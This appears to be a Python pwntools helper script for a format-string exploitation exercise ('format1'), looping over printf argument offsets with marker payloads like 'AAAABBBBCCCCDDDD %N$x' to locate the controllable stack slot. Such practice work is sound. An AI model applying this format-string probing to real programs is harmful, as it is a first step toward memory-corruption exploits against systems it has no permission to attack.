#!/usr/bin/env python
from pwn import *

# Run with:
# python helper_format1.py | grep -va 'rocess' | grep -aP '.*?AAAABBBBCCCCDDDD.*?4[1234]' | grep -aP '4[1234]'

e = ELF('./format1')

for i in range(1,1000):
	# The spaces are needed in order to properly align the format string
	# in 4B blocks - as the arguments for printf are treated as each being
	# 4B. If you delete some spaces you will notice that it starts being off
	payload = "AAAABBBBCCCCDDDD   %" + str(i) + "$x%" + str(i+1) + "$x"

	p = process(["./format1", payload])

	print("%d %s"% (i, p.read()))

	p.close()
